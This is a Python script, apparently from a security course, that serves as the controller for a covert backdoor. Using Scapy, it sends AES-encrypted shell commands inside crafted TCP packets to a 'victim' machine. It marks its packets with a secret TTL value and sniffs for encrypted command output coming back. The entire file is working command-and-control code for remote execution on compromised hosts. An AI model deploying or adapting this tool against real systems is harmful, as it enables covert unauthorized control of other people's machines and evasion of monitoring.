#!/usr/bin/python3
import sys
from scapy.layers.inet import *
from scapy.all import *
from Crypto.Cipher import AES
import time


# GLOBAL VARIABLES
global targetIP
global sourcePort
global ttlKey
global encryptionKey
global IV
global dstPort

#-----------------------------------------------------------------------------
# FUNCTION:    usage
#
#  PROGRAMMER:  Jason Soukchamroeun
#
#  INTERFACE:   def usage()
#
#  RETURNS:     None
#
#  NOTES: Ensures that user enters in the proper values by checking the number of arguments
#         Command should be in the format:
#         python3 client.py <targetIP> <sourcePort> <dstPort> <ttlKey> <encryptionKey> <IV>
#         i.e. - python3 client.py 10.0.0.23 500 80 71 0123456789abcdef abcdefghijklmnop
#
# ----------------------------------------------------------------------------


def usage():
    global targetIP
    global ttlKey
    global encryptionKey
    global IV
    global dstPort
    if len(sys.argv) < 5:
        print("Please use format python client.py <targetIP> <sourcePort> <dstPort> <ttlKey> <encryptionKey> <IV>")
        sys.exit()
    else:
        if len(sys.argv[5]) < 16:
            print("Please ensure that the key is 16 characters long")
            sys.exit()
        if len(sys.argv[6]) < 16:
            print("Please ensure that the initialization vector is 16 characters long")
            sys.exit()
        targetIP = sys.argv[1]
        print("START Victim IP is %s"%(targetIP))
        global sourcePort
        sourcePort = sys.argv[2]
        print("START Sending from Blackhat port: %s"%(sourcePort))
        dstPort = int(sys.argv[3])
        print("Send to destination port: " + str(dstPort))
        ttlKey = int(sys.argv[4])
        print("TTL Key is " + str(ttlKey))
        encryptionKey = sys.argv[5]
        print("Encryption key is " + encryptionKey)
        IV = sys.argv[6]
        print("IV is " + IV)


#-----------------------------------------------------------------------------
# FUNCTION:    encrypt_command
#
#  PROGRAMMER:  Jason Soukchamroeun
#
#  INTERFACE:   def encrypt_command(command)
#               command - The user's command string to add into the packet payload
#
#  RETURNS:     An encrypted command string
#
#  NOTES: Function encrypts the plaintext command entered by user using PyCryptodome,
#         encrypted with AES CFB.
#
# ----------------------------------------------------------------------------


def encrypt_command(command):
    global encryptionKey
    global ttlKey
    encryptionKey = encryptionKey
    ttlKey = ttlKey
    encryptor = AES.new(encryptionKey.encode(), AES.MODE_CFB, IV=IV.encode("utf8"))
    return encryptor.encrypt(command.encode("utf8"))

#-----------------------------------------------------------------------------
# FUNCTION:    decrypt_command
#
#  PROGRAMMER:  Jason Soukchamroeun
#
#  INTERFACE:   def decrypt_command(command)
#               command - The encrypted command contained in the packet payload.
#
#  RETURNS:     The decrypted plain text command contained in the packet payload.
#
#  NOTES: The function takes the encrypted command contained in the packet payload
#         and decrypts is using the same key and IV used at the victims system.
#
# ----------------------------------------------------------------------------


def decrypt_command(command):
    global encryptionKey
    decryptionKey = encryptionKey
    global IV
    IV = IV
    decryptor = AES.new(decryptionKey.encode("utf8"), AES.MODE_CFB, IV=IV.encode("utf8"))
    plain = decryptor.decrypt(command)
    return plain


#-----------------------------------------------------------------------------
# FUNCTION:    send_command
#
#  PROGRAMMER:  Jason Soukchamroeun
#
#  INTERFACE:   def send_command(command)
#               command - The user's command string to add into the packet payload.
#
#  RETURNS:     None
#
#  NOTES: Function takes the user input, crafts the packet and adds the input to the
#         payload using craft_command_packet() and then sends it to the victim machine.
#
# ----------------------------------------------------------------------------


def send_command(command):
    send(craft_command_packet(command))
    return


#-----------------------------------------------------------------------------
# FUNCTION:    craft_command_packet
#
#  PROGRAMMER:  Jason Soukchamroeun
#
#  INTERFACE:   def craft_command_packet(encrypted_command)
#               command - The user's encrypted command to add into the packet payload
#
#  RETURNS:     Crafted packet using the IP and TCP headers
#
#  NOTES: Function takes the string provided by the user and crafts a packet using
#         Scapy's API. The targetIP, and target Ports are taken from global variables.
#
# ----------------------------------------------------------------------------


def craft_command_packet(encrypted_command):
    global targetIP
    global sourcePort
    global ttlKey
    global dstPort

    # data = encrypt_command(command)
    data = encrypted_command
    packet = (IP(dst=targetIP, ttl=ttlKey)/TCP(sport=int(sourcePort), dport=dstPort)/data)
    return packet

#-----------------------------------------------------------------------------
# FUNCTION:    command_result
#
#  PROGRAMMER:  Jason Soukchamroeun
#
#  INTERFACE:   def command_result(packet)
#               packet - The packet that returns after a command has been sent
#               to the victim machine.
#
#  RETURNS:     True - Continue with code execution
#               False - Keep filtering for packets
#
#  NOTES: Function executes after a packet has been received from the victim machine.
#         Authenticates that is actually from the backdoor program by looking at the
#         TTL, which should be 71.
#
# ----------------------------------------------------------------------------


def command_result(packet):
    if IP in packet[0]:
        global targetIP
        global ttlKey
        srcIP = packet[IP].src
        ttl = packet[IP].ttl
        # Part of the key that signifies that this packet is for us (TTL = 71)
        if srcIP == targetIP and ttl == ttlKey:
            print(decrypt_command(packet.load).decode("utf8"))
            return True
        else:
            return False
    else:
        return False

#-----------------------------------------------------------------------------
# FUNCTION:    main
#
#  PROGRAMMER:  Jason Soukchamroeun
#
#  INTERFACE:   def main()
#
#  RETURNS:     Result on success or failure.
#
#  NOTES: Main entry point into the program. Initializes command-line argument
#         parsing. Encrypts or decrypts packets sent/received.
#
# ----------------------------------------------------------------------------

def main():
    usage()
    global dstPort
    # Go into the send/receive loop
    while True:
        command = input("ENTER COMMAND -> " + targetIP + ":")
        if command == "exit":
            sys.exit()
        else:
            send_command(encrypt_command(command))
            global sourcePort
            sniff(timeout=2, filter="tcp and dst port " + sourcePort + " and src port " + str(dstPort),
                  stop_filter=command_result)


if __name__ == "__main__":
    main()
